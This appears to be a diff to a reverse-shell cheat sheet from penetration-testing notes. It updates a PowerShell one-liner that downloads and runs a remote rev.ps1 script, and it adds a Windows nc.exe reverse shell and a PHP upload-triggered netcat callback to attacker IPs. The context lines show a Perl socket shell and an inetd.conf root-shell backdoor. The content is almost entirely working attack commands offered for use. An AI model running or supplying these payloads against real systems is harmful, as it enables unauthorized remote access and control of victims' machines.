@@ -74,7 +74,7 @@ perl -e 'use Socket:$i="192.168.45.163";$0=443;socket(S,PF INET,SOCK STREAM, get
 #### CMD
 
 ```bash
-'echo IEX(New-Object Net.WebClient).DownloadString("http://192.168.49.140:8000/rev.ps1") | powershell 
+'echo IEX(New-Object Net.WebClient).DownloadString("http://192.168.45.178:8000/rev.ps1") | powershell 
 -noprofile'
 ````
 
@@ -124,4 +124,22 @@ system("powershell IEX(IWR http://10.10.14.8:8000/conpty.ps1 -UseBasicParsing); 
 ```bash
 "echo '31337 stream tcp nowait root /bin/sh -i' >> /etc/inetd.conf"
 nc -nv $ip 31337
+```
+
+#### Windows nc.exe
+
+This is a reliable reverse shell from Windows computer. If you can upload a file, try msfvenom payload, and if that doesn't work, upload a nc.exe binary and try 
+
+```bash
+.\nc.exe -nv 192.168.XX.XX 445 -e cmd.exe
+```
+
+#### Two-Parter via File Upload Vuln
+
+Upload netcat.exe, then php file that will trigger it.
+
+```php
+<?php
+system('netcat.exe -vv 192.168.4.178 443 -e cmd.exe');
+?>
 ```
